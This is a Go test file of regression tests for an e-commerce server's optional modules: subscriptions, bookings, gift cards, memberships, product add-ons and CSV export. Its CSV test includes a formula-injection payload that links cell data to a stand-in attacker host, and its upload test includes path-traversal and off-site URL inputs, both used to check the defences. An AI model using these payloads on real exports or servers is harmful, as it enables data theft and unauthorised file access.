package server

import (
	"context"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"
)

// Regressions for the audit of the optional Commerce modules (subscriptions, bookings, memberships,
// gift cards, product add-ons, CSV exports).

// Month periods clamp to the end of the target month like wcs_add_months.
func TestGooExtAddPeriodMonthEnd(t *testing.T) {
	loc, _ := time.LoadLocation("Europe/Berlin")
	cases := []struct {
		from   time.Time
		period string
		n      int
		want   time.Time
	}{
		{time.Date(2027, 1, 31, 10, 30, 0, 0, time.UTC), "month", 1, time.Date(2027, 2, 28, 10, 30, 0, 0, time.UTC)},
		{time.Date(2028, 1, 31, 10, 30, 0, 0, time.UTC), "months", 1, time.Date(2028, 2, 29, 10, 30, 0, 0, time.UTC)},
		{time.Date(2027, 3, 31, 0, 0, 0, 0, time.UTC), "month", 1, time.Date(2027, 4, 30, 0, 0, 0, 0, time.UTC)},
		{time.Date(2027, 3, 31, 0, 0, 0, 0, time.UTC), "month", -1, time.Date(2027, 2, 28, 0, 0, 0, 0, time.UTC)},
		{time.Date(2027, 1, 31, 0, 0, 0, 0, time.UTC), "month", 13, time.Date(2028, 2, 29, 0, 0, 0, 0, time.UTC)},
		{time.Date(2028, 2, 29, 8, 0, 0, 0, time.UTC), "year", 1, time.Date(2029, 2, 28, 8, 0, 0, 0, time.UTC)},
		{time.Date(2027, 1, 15, 9, 0, 0, 0, loc), "month", 3, time.Date(2027, 4, 15, 9, 0, 0, 0, loc)}, // across DST: wall clock kept
		{time.Date(2027, 1, 31, 0, 0, 0, 0, time.UTC), "day", 1, time.Date(2027, 2, 1, 0, 0, 0, 0, time.UTC)},
	}
	for _, c := range cases {
		if got := gxaAddPeriod(c.from, c.period, c.n); !got.Equal(c.want) {
			t.Errorf("%s + %d %s = %s, want %s", c.from, c.n, c.period, got, c.want)
		}
	}
}

// Exported cells that a spreadsheet would run as a formula get a leading quote; numbers stay numbers.
func TestGooCSVFormulaEscape(t *testing.T) {
	in := []string{`=HYPERLINK("http://evil.example/?x="&A2,"Click")`, "+1+2", "-1+2", "@SUM(A1)", "\tcmd", "\rcmd", "-12.50", "42", "Ada", ""}
	want := []string{`'=HYPERLINK("http://evil.example/?x="&A2,"Click")`, "'+1+2", "'-1+2", "'@SUM(A1)", "'\tcmd", "'\rcmd", "-12.50", "42", "Ada", ""}
	got := gooCSVEscapeRow(in)
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("cell %q escaped to %q, want %q", in[i], got[i], want[i])
		}
	}
	if gooCSVUnescape("'\tcmd") != "\tcmd" || gooCSVUnescape("'=1") != "=1" || gooCSVUnescape("'quote") != "'quote" {
		t.Error("unescape does not reverse the escape")
	}
}

// gxAuditBookable is an hourly bookable product with places per block, available all day, 09:00 first block.
func gxAuditBookable(t *testing.T, srv *Server, name string, places int) *gooProduct {
	t.Helper()
	p := gooNewProduct(bkType)
	p.Name = name
	return gxSavePanels(t, srv, p, bkKey, url.Values{
		"_wc_booking_duration_type": {"fixed"}, "_wc_booking_duration": {"1"}, "_wc_booking_duration_unit": {"hour"},
		"_wc_booking_qty": {itoa64(int64(places))}, "_wc_booking_min_date": {"0"}, "_wc_booking_min_date_unit": {"day"}, "_wc_booking_max_date": {"12"},
		"_wc_booking_max_date_unit": {"month"}, "_wc_booking_first_block_time": {"09:00"},
		"_wc_booking_default_date_availability": {"available"}, "_wc_booking_cost": {"10"}, "_wc_booking_block_cost": {"0"},
	})
}

func gxAuditBookForm(day time.Time, hhmm string) map[string][]string {
	return map[string][]string{"wc_bookings_field_start_date": {day.Format("2006-01-02")}, "wc_bookings_field_start_date_time": {hhmm}}
}

func TestGooExtBookingsAudit(t *testing.T) {
	_, _, srv := gooSite(t)
	ctx := context.Background()
	if err := srv.gooSetExtension(ctx, bkKey, true); err != nil {
		t.Fatal(err)
	}
	if err := srv.settings.Set(ctx, map[string]any{"timezone_string": "Europe/Berlin"}); err != nil {
		t.Fatal(err)
	}
	loc := srv.gxLoc()
	if loc.String() != "Europe/Berlin" {
		t.Fatalf("site zone %s", loc)
	}

	// DST: on the spring-forward and fall-back days the 09:00 block is still 09:00 wall clock, and a
	// chosen 10:00 slot is stored at 10:00.
	p := gxAuditBookable(t, srv, "Room", 1)
	conf := bkConfOf(p)
	for _, day := range []time.Time{gxAuditNextDST(loc, time.March), gxAuditNextDST(loc, time.October)} {
		slots := srv.bkSlots(ctx, p, conf, day)
		if len(slots) == 0 || slots[0].Time != "09:00" {
			t.Fatalf("%s: first slot %+v", day.Format("2006-01-02"), slots)
		}
		start, _, _, err := srv.bkParseRequest(conf, gxAuditBookForm(day, "10:00"))
		if err != nil {
			t.Fatal(err)
		}
		if l := start.In(loc); l.Hour() != 10 || l.Minute() != 0 || l.Day() != day.Day() {
			t.Errorf("%s: 10:00 parsed as %s", day.Format("2006-01-02"), l)
		}
	}

	// Concurrency: one place left, eight visitors at once: exactly one hold is made.
	day := time.Now().In(loc).AddDate(0, 0, 3)
	var wg sync.WaitGroup
	var mu sync.Mutex
	ok := 0
	for i := 0; i < 8; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if err := bkAddToCart(srv, ctx, p, 1, gxAuditBookForm(day, "11:00"), map[string]any{}); err == nil {
				mu.Lock()
				ok++
				mu.Unlock()
			}
		}()
	}
	wg.Wait()
	var held int
	_ = srv.store.Pool.QueryRow(ctx, `SELECT count(*) FROM goo_bookings WHERE product_id = $1 AND status = 'in-cart'`, p.ID).Scan(&held)
	if ok != 1 || held != 1 {
		t.Errorf("one place booked %d times (%d holds)", ok, held)
	}

	// A failed payment cancels the booking; paying the order afterwards restores it.
	newOrder := func() *gooOrder {
		o := &gooOrder{Status: "pending", Currency: "USD", Billing: map[string]string{"email": "b@example.test"}, Shipping: map[string]string{}, Meta: map[string]any{},
			Items: []*gooOrderItem{{Type: "line_item", Name: p.Name, ProductID: p.ID, Quantity: 1, Subtotal: 10, Total: 10, Meta: map[string]any{}}}}
		srv.gooRecalculate(o)
		if err := srv.gooSaveOrder(ctx, o, true); err != nil {
			t.Fatal(err)
		}
		return o
	}
	slot := time.Date(day.Year(), day.Month(), day.Day(), 14, 0, 0, 0, loc)
	o1 := newOrder()
	b1 := &bkBooking{ProductID: p.ID, OrderID: o1.ID, Status: "unpaid", Start: slot, End: slot.Add(time.Hour), Persons: map[string]any{}}
	if err := srv.bkInsert(ctx, b1); err != nil {
		t.Fatal(err)
	}
	if err := srv.gooSetStatus(ctx, o1, "failed", "", ""); err != nil {
		t.Fatal(err)
	}
	if b, _ := srv.bkGet(ctx, b1.ID); b.Status != "cancelled" {
		t.Fatalf("booking after the failed payment: %s", b.Status)
	}
	if err := srv.gooSetStatus(ctx, o1, "processing", "", ""); err != nil {
		t.Fatal(err)
	}
	if b, _ := srv.bkGet(ctx, b1.ID); b.Status != "paid" {
		t.Errorf("booking after the late payment: %s", b.Status)
	}

	// The slot went to someone else meanwhile: the booking stays cancelled and the order says so.
	slot2 := slot.Add(2 * time.Hour)
	o2 := newOrder()
	b2 := &bkBooking{ProductID: p.ID, OrderID: o2.ID, Status: "unpaid", Start: slot2, End: slot2.Add(time.Hour), Persons: map[string]any{}}
	if err := srv.bkInsert(ctx, b2); err != nil {
		t.Fatal(err)
	}
	if err := srv.gooSetStatus(ctx, o2, "cancelled", "", ""); err != nil {
		t.Fatal(err)
	}
	other := &bkBooking{ProductID: p.ID, Status: "paid", Start: slot2, End: slot2.Add(time.Hour), Persons: map[string]any{}}
	if err := srv.bkInsert(ctx, other); err != nil {
		t.Fatal(err)
	}
	if err := srv.gooSetStatus(ctx, o2, "processing", "", ""); err != nil {
		t.Fatal(err)
	}
	if b, _ := srv.bkGet(ctx, b2.ID); b.Status != "cancelled" {
		t.Errorf("double-booked a taken slot: %s", b.Status)
	}
	if n := gxAuditOrderNotes(t, srv, o2, "could not be restored"); n == 0 {
		t.Error("no order note for the booking that could not be restored")
	}
}

// gxAuditNextDST is the next day in the given month on which the zone changes its offset.
func gxAuditNextDST(loc *time.Location, month time.Month) time.Time {
	now := time.Now().In(loc)
	for y := now.Year(); ; y++ {
		for d := 1; d <= 31; d++ {
			day := time.Date(y, month, d, 0, 0, 0, 0, loc)
			if day.Month() != month || day.Before(now) {
				continue
			}
			_, a := day.Zone()
			_, b := day.Add(24 * time.Hour).Zone()
			if a != b {
				return day
			}
		}
	}
}

// gxAuditOrderNotes counts the order's notes containing text.
func gxAuditOrderNotes(t *testing.T, srv *Server, o *gooOrder, text string) int {
	t.Helper()
	n := 0
	notes, _ := srv.gooOrderNotes(context.Background(), o.ID, false)
	for _, note := range notes {
		if strings.Contains(note.Content, text) {
			n++
		}
	}
	return n
}

func TestGooExtGiftCardsAudit(t *testing.T) {
	_, _, srv := gooSite(t)
	ctx := context.Background()
	gxTestGateway(t, srv)
	if err := srv.gooSetExtension(ctx, gcKey, true); err != nil {
		t.Fatal(err)
	}

	// gcAdjust is relative: a debit made after the card was read is not overwritten.
	card := &gcCard{Initial: 100, Recipient: "r@example.test", Sender: "Shop"}
	if err := srv.gcCreate(ctx, card, 1, "test"); err != nil {
		t.Fatal(err)
	}
	stale, _ := srv.gcGet(ctx, card.ID)
	if _, err := srv.store.Pool.Exec(ctx, `UPDATE goo_gift_cards SET balance = balance - 40 WHERE id = $1`, card.ID); err != nil {
		t.Fatal(err)
	}
	if err := srv.gcAdjust(ctx, stale, 30, "manual", 0, 1, "credit"); err != nil {
		t.Fatal(err)
	}
	if g, _ := srv.gcGet(ctx, card.ID); g.Balance != 90 || stale.Balance != 90 || g.Status != "active" {
		t.Errorf("balance after a concurrent debit and a credit: %v (in memory %v), want 90", g.Balance, stale.Balance)
	}
	if err := srv.gcAdjust(ctx, stale, -500, "manual", 0, 1, "debit"); err != nil {
		t.Fatal(err)
	}
	if g, _ := srv.gcGet(ctx, card.ID); g.Balance != 0 || g.Status != "redeemed" {
		t.Errorf("over-debit: %v %s", g.Balance, g.Status)
	}

	// A cancelled order credits its card back; paying it afterwards debits the card again.
	lamp := gooMakeSimple(t, srv, "Lamp", 100, func(p *gooProduct) { p.Virtual = true })
	card2 := &gcCard{Initial: 30, Recipient: "r@example.test", Sender: "Shop"}
	if err := srv.gcCreate(ctx, card2, 1, "test"); err != nil {
		t.Fatal(err)
	}
	c := gooTestCtx()
	cart := srv.gooCartFor(c)
	cart.sess.Data.Customer.Billing = map[string]string{"country": "US", "state": "CA", "postcode": "90210", "email": "buyer@example.test"}
	if _, err := cart.Add(ctx, lamp.ID, 1, 0, nil, nil, nil); err != nil {
		t.Fatal(err)
	}
	if _, err := srv.gcApply(c, card2.Code); err != nil {
		t.Fatal(err)
	}
	o, errs := gxCheckout(t, srv, c, "goo_test")
	if len(errs) > 0 || o == nil {
		t.Fatalf("checkout: %v", errs)
	}
	if g, _ := srv.gcGet(ctx, card2.ID); g.Balance != 0 {
		t.Fatalf("card after the order: %v", g.Balance)
	}
	o, _ = srv.gooGetOrder(ctx, o.ID)
	if err := srv.gooSetStatus(ctx, o, "cancelled", "", ""); err != nil {
		t.Fatal(err)
	}
	if g, _ := srv.gcGet(ctx, card2.ID); g.Balance != 30 {
		t.Fatalf("card after the cancellation: %v", g.Balance)
	}
	if err := srv.gooSetStatus(ctx, o, "processing", "", ""); err != nil {
		t.Fatal(err)
	}
	if g, _ := srv.gcGet(ctx, card2.ID); g.Balance != 0 || g.Status != "redeemed" {
		t.Errorf("card after the order was paid again: %v %s", g.Balance, g.Status)
	}
	if o2, _ := srv.gooGetOrder(ctx, o.ID); o2.Meta[gcStatusCreditKey] != nil {
		t.Errorf("status credit left on the order: %v", o2.Meta[gcStatusCreditKey])
	}
	// Cancelled again: credited once more (what is outstanding), not twice.
	if err := srv.gooSetStatus(ctx, o, "cancelled", "", ""); err != nil {
		t.Fatal(err)
	}
	if g, _ := srv.gcGet(ctx, card2.ID); g.Balance != 30 {
		t.Errorf("card after the second cancellation: %v", g.Balance)
	}
}

func TestGooExtMembershipsAudit(t *testing.T) {
	_, _, srv := gooSite(t)
	ctx := context.Background()
	gxaOn(t, srv, gmemKey, true)
	gxaOn(t, srv, gsubKey, true)
	pass := gooMakeSimple(t, srv, "Gold Pass", 50, func(p *gooProduct) { p.Virtual = true })
	gold := &gooMembershipPlan{Name: "Gold", AccessMethod: "purchase", ProductIDs: []int64{pass.ID}, AccessLength: "specific", AccessAmount: 1, AccessPeriod: "years"}
	if err := srv.gmemSavePlan(ctx, gold); err != nil {
		t.Fatal(err)
	}
	u := gxaCustomer(t, srv, "member@example.test")
	order := func(customer int64) *gooOrder {
		o := &gooOrder{Status: "pending", Currency: "USD", CustomerID: customer, Billing: map[string]string{"email": "m@example.test"}, Shipping: map[string]string{}, Meta: map[string]any{},
			Items: []*gooOrderItem{{Type: "line_item", Name: pass.Name, ProductID: pass.ID, Quantity: 1, Subtotal: 50, Total: 50, Meta: map[string]any{}}}}
		srv.gooRecalculate(o)
		if err := srv.gooSaveOrder(ctx, o, true); err != nil {
			t.Fatal(err)
		}
		return o
	}
	end := func(userID int64) *time.Time {
		list := srv.gmemUMList(ctx, userID, gold.ID, "")
		if len(list) != 1 {
			t.Fatalf("%d memberships", len(list))
		}
		return list[0].End
	}
	years := func(e *time.Time) float64 { return e.Sub(time.Now()).Hours() / 24 / 365 }

	// Two purchases are two years, whatever order processing / completed arrive in.
	a, b := order(u.ID), order(u.ID)
	for _, step := range []struct {
		o  *gooOrder
		to string
	}{{a, "processing"}, {b, "processing"}, {a, "completed"}, {b, "completed"}} {
		if err := srv.gooSetStatus(ctx, step.o, step.to, "", ""); err != nil {
			t.Fatal(err)
		}
	}
	if y := years(end(u.ID)); y < 1.9 || y > 2.1 {
		t.Errorf("two purchases gave %.2f years", y)
	}

	// A refunded order cancels the membership it granted; paying it again grants it again.
	u2 := gxaCustomer(t, srv, "refund@example.test")
	r := order(u2.ID)
	if err := srv.gooSetStatus(ctx, r, "processing", "", ""); err != nil {
		t.Fatal(err)
	}
	if err := srv.gooSetStatus(ctx, r, "refunded", "", ""); err != nil {
		t.Fatal(err)
	}
	if m := srv.gmemUMList(ctx, u2.ID, gold.ID, ""); len(m) != 1 || m[0].Status != "cancelled" || m[0].HasAccess(time.Now()) {
		t.Fatalf("membership of a refunded order: %+v", m[0])
	}
	if err := srv.gooSetStatus(ctx, r, "processing", "", ""); err != nil {
		t.Fatal(err)
	}
	if m := srv.gmemUMList(ctx, u2.ID, gold.ID, ""); len(m) != 1 || m[0].Status != "active" {
		t.Errorf("membership after the order was paid again: %s", m[0].Status)
	}

	// Memberships follow the subscription of the order that granted them.
	unl := &gooMembershipPlan{Name: "Club", AccessMethod: "manual", AccessLength: "unlimited"}
	if err := srv.gmemSavePlan(ctx, unl); err != nil {
		t.Fatal(err)
	}
	u3 := gxaCustomer(t, srv, "sub@example.test")
	parent := order(u3.ID)
	if err := srv.gooSetStatus(ctx, parent, "processing", "", ""); err != nil {
		t.Fatal(err)
	}
	if _, err := srv.gmemGrant(ctx, u3.ID, unl, parent.ID, pass.ID, "From the subscription."); err != nil {
		t.Fatal(err)
	}
	next := time.Now().AddDate(0, 0, 20)
	sub := &gooSubscription{ParentOrderID: parent.ID, CustomerID: u3.ID, Status: "active", Period: "month", Interval: 1, Currency: "USD",
		Start: time.Now(), NextPayment: &next, Billing: map[string]string{}, Shipping: map[string]string{}}
	if err := srv.gsubSave(ctx, sub); err != nil {
		t.Fatal(err)
	}
	club := func() *gooUserMembership { return srv.gmemUMList(ctx, u3.ID, unl.ID, "")[0] }
	for _, step := range []struct{ to, want string }{{"on-hold", "paused"}, {"active", "active"}, {"pending-cancel", "pending-cancel"}} {
		if err := srv.gsubUpdateStatus(ctx, sub, step.to, "", ""); err != nil {
			t.Fatal(err)
		}
		if m := club(); m.Status != step.want {
			t.Errorf("subscription %s: membership %s, want %s", step.to, m.Status, step.want)
		}
	}
	if m := club(); m.End == nil || m.End.Sub(next).Abs() > time.Minute {
		t.Errorf("pending cancellation ends the membership with the prepaid period: %v", m.End)
	}
	if err := srv.gsubUpdateStatus(ctx, sub, "active", "", ""); err != nil {
		t.Fatal(err)
	}
	if m := club(); m.Status != "active" || m.End != nil {
		t.Errorf("reactivated: %s %v", m.Status, m.End)
	}
	// The parent order refunded: the live subscription and its membership are cancelled.
	if err := srv.gooSetStatus(ctx, parent, "refunded", "", ""); err != nil {
		t.Fatal(err)
	}
	if s2, _ := srv.gsubGet(ctx, sub.ID); s2.Status != "cancelled" {
		t.Errorf("subscription of a refunded parent order: %s", s2.Status)
	}
	if m := club(); m.Status != "cancelled" {
		t.Errorf("membership of a refunded subscription: %s", m.Status)
	}
}

func TestGooExtSubscriptionsEarlyRenewalAudit(t *testing.T) {
	_, _, srv := gooSite(t)
	ctx := context.Background()
	gxaOn(t, srv, gsubKey, true)
	u := gxaCustomer(t, srv, "early@example.test")
	mk := func(next time.Time) *gooSubscription {
		sub := &gooSubscription{CustomerID: u.ID, Status: "active", Period: "month", Interval: 1, Currency: "USD", Start: time.Now().AddDate(0, -1, 0),
			NextPayment: &next, Billing: map[string]string{"email": u.Email}, Shipping: map[string]string{},
			Items: []gsubItem{{Name: "Box", Qty: 1, Total: 10}}}
		if err := srv.gsubSave(ctx, sub); err != nil {
			t.Fatal(err)
		}
		return sub
	}
	// An abandoned "Renew now" order is cancelled after the grace period; the subscription stays active.
	sub := mk(time.Now().AddDate(0, 0, 18))
	early, err := srv.gsubCreateRenewal(ctx, sub, true)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := srv.store.Pool.Exec(ctx, `UPDATE goo_orders SET date_created = now() - interval '5 days' WHERE id = $1`, early.ID); err != nil {
		t.Fatal(err)
	}
	srv.gsubScheduler(ctx)
	s1, _ := srv.gsubGet(ctx, sub.ID)
	if s1.Status != "active" || gxaInt64(s1.Meta, "_pending_renewal") != 0 {
		t.Errorf("after an abandoned early renewal: %s pending %v", s1.Status, s1.Meta["_pending_renewal"])
	}
	if o, _ := srv.gooGetOrder(ctx, early.ID); o.Status != "cancelled" {
		t.Errorf("abandoned early renewal order: %s", o.Status)
	}
	// A failed early renewal payment does not suspend the paid period.
	sub3 := mk(time.Now().AddDate(0, 0, 18))
	e3, err := srv.gsubCreateRenewal(ctx, sub3, true)
	if err != nil {
		t.Fatal(err)
	}
	if err := srv.gooSetStatus(ctx, e3, "failed", "", ""); err != nil {
		t.Fatal(err)
	}
	if s3, _ := srv.gsubGet(ctx, sub3.ID); s3.Status != "active" {
		t.Errorf("failed early renewal suspended the subscription: %s", s3.Status)
	}
	// The regular renewal is due while an early renewal waits: the early order makes way.
	sub2 := mk(time.Now().Add(-time.Hour))
	e2, err := srv.gsubCreateRenewal(ctx, sub2, true)
	if err != nil {
		t.Fatal(err)
	}
	srv.gsubScheduler(ctx)
	s2, _ := srv.gsubGet(ctx, sub2.ID)
	if p := gxaInt64(s2.Meta, "_pending_renewal"); p == 0 || p == e2.ID {
		t.Errorf("regular renewal not created: pending %d (early %d)", p, e2.ID)
	}
	if s2.NextPayment == nil || !s2.NextPayment.After(time.Now()) {
		t.Errorf("next payment not moved on: %v", s2.NextPayment)
	}
	if o, _ := srv.gooGetOrder(ctx, e2.ID); o.Status != "cancelled" {
		t.Errorf("superseded early renewal order: %s", o.Status)
	}
}

func TestGooExtAddonsUploadAudit(t *testing.T) {
	_, _, srv := gooSite(t)
	ctx := context.Background()
	gxaOn(t, srv, paoKey, true)
	dir := filepath.Join(srv.cfg.UploadsDir, "goocommerce_uploads", "0123abcd")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "design.pdf"), []byte("%PDF"), 0o644); err != nil {
		t.Fatal(err)
	}
	other := filepath.Join(srv.cfg.UploadsDir, "2026", "11")
	_ = os.MkdirAll(other, 0o755)
	_ = os.WriteFile(filepath.Join(other, "x.pdf"), []byte("%PDF"), 0o644)
	good := srv.uploadURL(ctx, "goocommerce_uploads/0123abcd/design.pdf")
	for v, want := range map[string]bool{
		good: true,
		"/wp-content/uploads/goocommerce_uploads/0123abcd/design.pdf":                     true,
		"https://evil.example/wp-content/uploads/goocommerce_uploads/0123abcd/design.pdf": false,
		"/wp-content/uploads/goocommerce_uploads/0123abcd/missing.pdf":                    false,
		"/wp-content/uploads/2026/11/x.pdf":                                               false,
		"/wp-content/uploads/goocommerce_uploads/../2026/11/x.pdf":                        false,
		"/x/wp-content/uploads/goocommerce_uploads/0123abcd/design.pdf":                   false,
	} {
		if got := srv.paoIsUploadedFile(ctx, v); got != want {
			t.Errorf("paoIsUploadedFile(%q) = %v, want %v", v, got, want)
		}
	}
	// The order item shows the file's URL, not only its name.
	o := &gooOrder{Meta: map[string]any{}, Items: []*gooOrderItem{{Type: "line_item", Name: "Poster", Meta: map[string]any{
		"_goo_addons": []any{map[string]any{"name": "Artwork", "value": good, "display": "design.pdf", "field_type": "file_upload", "price": 0.0}},
		"_display":    []any{map[string]any{"key": "Artwork", "value": "design.pdf"}},
	}}}}
	if err := paoCheckout(srv, ctx, nil, o); err != nil {
		t.Fatal(err)
	}
	if kv := gooItemDisplayMeta(o.Items[0]); len(kv) != 1 || kv[0].Value != good {
		t.Errorf("order item meta: %+v", kv)
	}
}
